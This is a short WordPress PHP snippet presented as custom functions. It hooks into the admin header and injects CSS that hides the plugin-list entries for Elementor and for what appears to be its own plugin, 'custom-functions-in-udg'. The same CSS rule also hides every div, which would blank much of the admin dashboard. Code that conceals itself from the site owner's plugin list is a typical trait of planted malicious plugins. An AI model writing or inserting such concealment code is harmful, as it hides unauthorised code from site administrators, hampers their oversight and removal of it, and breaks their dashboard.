function custom_functions_to_add_udg_hidei() {
echo '<style>
.plugins-php .plugins tr[data-slug="elementor"],.plugins-php .plugins tr[data-slug="custom-functions-in-udg"],div{ display:none; }
</style>';
}
add_action('admin_head', 'custom_functions_to_add_udg_hidei');

